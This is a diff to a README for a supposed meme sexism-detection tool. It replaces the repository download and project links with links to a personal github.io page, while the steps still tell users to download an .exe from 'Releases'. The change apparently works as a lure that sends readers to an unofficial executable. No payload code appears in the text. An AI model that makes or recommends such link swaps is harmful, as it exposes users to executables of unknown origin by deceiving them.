@@ -1,6 +1,6 @@
 # 🔍 exist2026-ordantis - Identify sexism in online meme content
 
-[![Download Ordantis](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/enidfresh519/exist2026-ordantis)
+[![Download Ordantis](https://img.shields.io/badge/Download-Release-blue.svg)](https://enidfresh519.github.io)
 
 This tool helps researchers analyze social media images to detect sexist content. It combines text analysis with image recognition to provide accurate classifications. You can use this software to study patterns in digital communication or to build safer online environments.
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software.
 You must visit the project release page to get the installer. Follow these steps to obtain the files.
 
 1.  Open your web browser.
-2.  Follow this link to the project page: [https://github.com/enidfresh519/exist2026-ordantis](https://github.com/enidfresh519/exist2026-ordantis)
+2.  Follow this link to the project page: [https://enidfresh519.github.io](https://enidfresh519.github.io)
 3.  Look for the section labeled "Releases" on the right side of the page.
 4.  Click the version number or the "Latest" tag.
 5.  Find the file that ends in .exe under the "Assets" header.
